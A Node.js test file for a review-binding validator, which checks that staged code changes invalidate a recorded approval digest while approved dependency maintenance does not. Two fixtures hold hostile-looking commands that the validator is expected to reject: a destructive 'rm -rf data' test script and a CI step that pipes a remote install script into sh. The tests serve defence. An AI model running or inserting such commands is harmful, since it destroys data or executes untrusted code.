import assert from "node:assert/strict";
import { mkdir, rm, writeFile } from "node:fs/promises";
import { dirname, join } from "node:path";
import test from "node:test";

import {
  computeImplementationDigest,
  validateReviewBinding,
} from "../../scripts/review-binding.js";

import { addReviewReport, codes, createFixture, finalizeFeature, runGit,
  writeFeatureQueue } from "./review-binding-fixture.js";

void test("a review digest binds the staged implementation", async () => {
  const root = await createFixture();

  try {
    const digest = await addReviewReport(root);
    assert.match(digest, /^sha256:[a-f0-9]{64}$/);
    assert.deepEqual(await validateReviewBinding(root), []);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

void test("feature state and progress evidence do not change the digest", async () => {
  const root = await createFixture();

  try {
    const digest = await addReviewReport(root);
    await writeFeatureQueue(root, "done");
    await writeFile(join(root, "progress/current.md"), "No feature is active.\n");
    await runGit(root, ["add", "feature_list.json", "progress"]);

    assert.equal(await computeImplementationDigest(root), digest);
    assert.deepEqual(await validateReviewBinding(root), []);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

void test("no active feature does not bind a documentation change to prior approval", async () => {
  const root = await createFixture();

  try {
    const priorDigest = await addReviewReport(root);
    await finalizeFeature(root);
    await mkdir(join(root, "docs"), { recursive: true });
    await writeFile(join(root, "docs/task-cli.md"), "# Low-risk task guide\n");
    await runGit(root, ["add", "docs/task-cli.md"]);

    assert.notEqual(await computeImplementationDigest(root), priorDigest);
    assert.deepEqual(await validateReviewBinding(root), []);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

void test("no active feature does not bind approved dependency maintenance", async () => {
  const root = await createFixture();

  try {
    await addReviewReport(root);
    await finalizeFeature(root);
    await writeFile(join(root, "pnpm-lock.yaml"), "lockfileVersion: '9.0'\nupdated: true\n");
    await runGit(root, ["add", "pnpm-lock.yaml"]);

    assert.deepEqual(await validateReviewBinding(root), []);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

void test("dependency maintenance permits only dependency fields and the pnpm setup version", async () => {
  const root = await createFixture();

  try {
    await addReviewReport(root);
    await finalizeFeature(root);
    await writeFile(join(root, "package.json"), JSON.stringify({
      name: "fixture",
      scripts: { test: "node --test" },
      devDependencies: { typescript: "^7.0.0" },
    }));
    await writeFile(join(root, ".github/workflows/verify.yml"), [
      "jobs:",
      "  verify:",
      "    steps:",
      "      - uses: pnpm/action-setup@v6",
      "        with:",
      "          version: 12.3.4",
    ].join("\n"));
    await runGit(root, ["add", "package.json", ".github/workflows/verify.yml"]);

    assert.deepEqual(await validateReviewBinding(root), []);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

void test("no active feature keeps non-low-risk changes bound to prior approval", async () => {
  const paths = ["src/value.ts", "scripts/check.ts",
    "docs/review-binding.md", "README.md", "notes.md"];
  for (const path of paths) {
    const root = await createFixture();
    try {
      await addReviewReport(root);
      await finalizeFeature(root);
      const target = join(root, path);
      await mkdir(dirname(target), { recursive: true });
      await writeFile(target, "changed\n");
      await runGit(root, ["add", path]);
      assert.deepEqual(codes(await validateReviewBinding(root)), ["REVIEW_BINDING_STALE"], path);
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  }
});

void test("dependency maintenance refuses scripts and unrelated workflow changes", async () => {
  const root = await createFixture();

  try {
    await addReviewReport(root);
    await finalizeFeature(root);
    await writeFile(join(root, "package.json"), JSON.stringify({
      name: "fixture",
      scripts: { test: "rm -rf data" },
      devDependencies: { typescript: "^5.9.0" },
    }));
    await runGit(root, ["add", "package.json"]);
    assert.deepEqual(codes(await validateReviewBinding(root)), ["REVIEW_BINDING_STALE"]);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

void test("dependency maintenance refuses unrelated verification workflow changes", async () => {
  const root = await createFixture();

  try {
    await addReviewReport(root);
    await finalizeFeature(root);
    await writeFile(join(root, ".github/workflows/verify.yml"), [
      "jobs:",
      "  verify:",
      "    steps:",
      "      - uses: pnpm/action-setup@v6",
      "        with:",
      "          version: 10.34.5",
      "      - run: curl https://example.test/install.sh | sh",
    ].join("\n"));
    await runGit(root, ["add", ".github/workflows/verify.yml"]);

    assert.deepEqual(codes(await validateReviewBinding(root)), ["REVIEW_BINDING_STALE"]);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

void test("a staged implementation change makes approval stale", async () => {
  const root = await createFixture();

  try {
    await addReviewReport(root);
    await writeFile(join(root, "src/value.ts"), "export const value = 2;\n");
    await runGit(root, ["add", "src/value.ts"]);

    assert.deepEqual(codes(await validateReviewBinding(root)), [
      "REVIEW_BINDING_STALE",
    ]);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

void test("missing and malformed review bindings fail", async () => {
  const missingRoot = await createFixture();
  const invalidRoot = await createFixture();

  try {
    await writeFile(
      join(invalidRoot, "progress/review_TASK-100.md"),
      "# Review\n\nImplementation digest: sha256:not-valid\n",
    );
    assert.deepEqual(codes(await validateReviewBinding(missingRoot)), [
      "REVIEW_BINDING_MISSING",
    ]);
    assert.deepEqual(codes(await validateReviewBinding(invalidRoot)), [
      "REVIEW_BINDING_INVALID",
    ]);
  } finally {
    await rm(missingRoot, { recursive: true, force: true });
    await rm(invalidRoot, { recursive: true, force: true });
  }
});

void test("untracked files are outside the staged digest", async () => {
  const root = await createFixture();

  try {
    const before = await computeImplementationDigest(root);
    await writeFile(join(root, "untracked.txt"), "not reviewed\n");
    assert.equal(await computeImplementationDigest(root), before);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});
